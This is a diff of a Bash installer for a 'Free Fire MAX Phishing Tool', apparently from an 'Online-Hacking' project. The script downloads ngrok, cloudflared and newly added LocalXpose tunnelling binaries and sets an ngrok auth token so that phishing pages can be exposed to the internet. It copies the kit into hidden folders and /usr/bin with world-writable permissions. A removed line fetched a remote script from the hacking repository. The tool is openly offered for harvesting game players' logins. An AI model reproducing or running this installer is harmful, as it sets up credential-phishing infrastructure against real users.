@@ -2,11 +2,6 @@
 echo ""
 clear
 echo ""
-echo -e ""
-rm -rf FreeFire-Phishing
-wget -q https://raw.githubusercontent.com/Online-Hacking/Mr-OnlineHacking/main/OnlineHacking/SUMAN/FreeFire/SM/FreeFire-Phishing .Linux-Setup.sh
-clear
-echo ""
 
 logo() {
 echo -e ""
@@ -70,7 +65,7 @@ download() {
 		chmod +x $output $file > /dev/null 2>&1
 		rm -rf file1
 	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
+		echo -e "\e[91m Error occured while downloading ${output}."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -78,9 +73,9 @@ download() {
 
 install_ngrok() {
 	if [[ -e "ngrok" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
+		echo -e "\e[91m[\e[92m-\e[91m] \e[96m Ngrok already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		echo -e "\e[91m[\e[92m*\e[91m] \e[96m Installing Ngrok..."
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
@@ -97,9 +92,9 @@ install_ngrok() {
 
 install_cloudflared() {
 	if [[ -e "cloudflared" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+		echo -e "\e[91m[\e[92m-\e[91m] \e[96m Cloudflared already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		echo -e "\e[91m[\e[92m*\e[91m] \e[96m Installing Cloudflared..."
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
@@ -113,7 +108,24 @@ install_cloudflared() {
 	fi
 }
 
-
+## Install LocalXpose
+install_localxpose() {
+	if [[ -e "loclx" ]]; then
+		echo -e "\e[91m[\e[92m-\e[91m] \e[96m LocalXpose already installed."
+	else
+		echo -e "\e[91m[\e[92m*\e[91m] \e[96m Installing LocalXpose..."
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
+		else
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
+		fi
+	fi
+}
 
 
 ngroktoken() {
@@ -131,7 +143,7 @@ echo -e "\e[93m
 \e[0m\n"
 echo ""
 echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mToken ? \e[1;91m (y/n) : \e[0m' option
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mAuth Token ? \e[1;91m (y/n) : \e[0m' option
 echo""
 echo""
 echo""
@@ -147,8 +159,8 @@ echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
 echo ""
 echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
 echo ""
-read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token \e[91m[Ex. \e[92mngrok config add-authtoken 1ahJYl6... \e[92m] : \e[0m' token
-$token
+read -p $'\e[31m[\e[32m*\e[31m]\e[33m Input AuthToken Only \e[91m[Ex. \e[92m2cEG2LcBt**********WK5Ntc \e[92m] : \e[0m' token
+ngrok config add-authtoken $token
 echo ""
 fi
 if [[ $option == *'n'* ]]; then
@@ -156,10 +168,12 @@ clear
 fi
 }
 
+
 uninstall() {
 echo -e ""
 rm -rf /usr/bin/ngrok
 rm -rf /usr/bin/cloudflared
+rm -rf /usr/bin/loclx
 rm -rf /usr/bin/.SUMAN/1 /usr/bin/.SUMAN/2 /usr/bin/.SUMAN/3 /usr/bin/.SUMAN/4 /usr/bin/.SUMAN/5 /usr/bin/.SUMAN/6 /usr/bin/.SUMAN/7 /usr/bin/.SUMAN/8 /usr/bin/.SUMAN/9 /usr/bin/.SUMAN/0
 rm -rf /usr/bin/FF
 rm -rf /usr/bin/FreeFire
@@ -179,10 +193,10 @@ echo ""
 echo ""
 echo ""
 echo ""
-echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Use All Step Install Working \e[0m"
+echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Use All Step Install successfully \e[0m"
 echo ""
 echo ""
-echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 1 :\e[0m\e[1;36m Play Install & Use Video  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 1 :\e[0m\e[1;36m Setup Tool Installation Video  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 2 :\e[0m\e[1;36m Enter Activation Key  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 3 :\e[0m\e[1;36m Download Requirement "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Link Services  "
@@ -202,7 +216,7 @@ echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!       Welcome to O
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
 echo ""
 echo -e ""
-echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m How To Install And Use This Tool Play Video \e[0m"
+echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m If You are not Understand. Play Installation Video \e[0m"
 echo ""
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Video Link :\e[0m\e[1;36m https://www.hacktube.xyz/v/  "
 echo ""
@@ -216,8 +230,10 @@ echo ""
 clear
 }
 
-
-
+echo ""
+clear
+welcome
+clear
 echo ""
 echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The FREE FIRE MAX Phishing Tool Please Wait....  \e[0m"
 echo -e ""
@@ -266,6 +282,8 @@ sudo apt install unzip -y
 sudo apt install ruby -y
 gem install lolcat
 sudo apt install wget -y
+sudo apt install ssh -y 
+sudo apt install jq -y
 clear
 echo""
 logo2
@@ -280,6 +298,11 @@ rm -rf ngrok-v3*.tgz
 echo ""
 install_cloudflared
 mv cloudflared-li* cloudflared
+echo ""
+install_localxpose
+rm -rf  loclx-linux*
+echo ""
+chmod +x loclx loclx*
 chmod +x cloudflared ngrok
 sleep 1
 echo""
@@ -306,27 +329,28 @@ clear
 ngroktoken
 
 echo
-cp -R cloudflared ngrok .SUMAN/1/
-cp -R cloudflared ngrok .SUMAN/2/
-cp -R cloudflared ngrok .SUMAN/3/
-cp -R cloudflared ngrok .SUMAN/4/
-cp -R cloudflared ngrok .SUMAN/5/
-cp -R cloudflared ngrok .SUMAN/6/
-cp -R cloudflared ngrok .SUMAN/7/
-cp -R cloudflared ngrok .SUMAN/8/
-cp -R cloudflared ngrok .SUMAN/9/
-cp -R cloudflared ngrok .SUMAN/0/
+cp -R cloudflared ngrok loclx .SUMAN/1/
+cp -R cloudflared ngrok loclx .SUMAN/2/
+cp -R cloudflared ngrok loclx .SUMAN/3/
+cp -R cloudflared ngrok loclx .SUMAN/4/
+cp -R cloudflared ngrok loclx .SUMAN/5/
+cp -R cloudflared ngrok loclx .SUMAN/6/
+cp -R cloudflared ngrok loclx .SUMAN/7/
+cp -R cloudflared ngrok loclx .SUMAN/8/
+cp -R cloudflared ngrok loclx .SUMAN/9/
+cp -R cloudflared ngrok loclx .SUMAN/0/
 chmod 7777 FreeFire-Phishing
 clear
 echo
 uninstall
 echo
 cp -R ngrok /usr/bin/
-cp -R cloudflared-linux-386 /usr/bin/
+cp -R cloudflared /usr/bin/
+cp -R loclx /usr/bin/
 cp -R .SUMAN /usr/bin/
+cp -R FF /usr/bin/
 cp -R FreeFire /usr/bin/
 cp -R FreeFire-Phishing /usr/bin/
-cp -R FF /usr/bin/
 cp -R OnlineHacking /usr/bin/
 clear
 echo
@@ -342,17 +366,17 @@ echo
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
-sleep 4
+sleep 2
 echo
-echo -e "\e[1m \e[36m[+] There Free Fire Phishing Tool Ready \e[m \e[21"
+echo -e "\e[1m \e[36m[+] There Free Fire Max Phishing Tool Ready \e[m \e[21"
 echo
 echo
-echo -e "\e[92m[+] Open New type this command:\e[93m FreeFire-Phishing \e[m "
+echo -e "\e[92m[+] Now Type This Command:\e[93m FreeFire-Phishing \e[m "
 echo
 fi
 
 echo
-rm -rf Linux-Setup.sh .SUMAN
+rm -rf .Linux-Setup.sh .SUMAN
 sleep 2
 echo
 exit
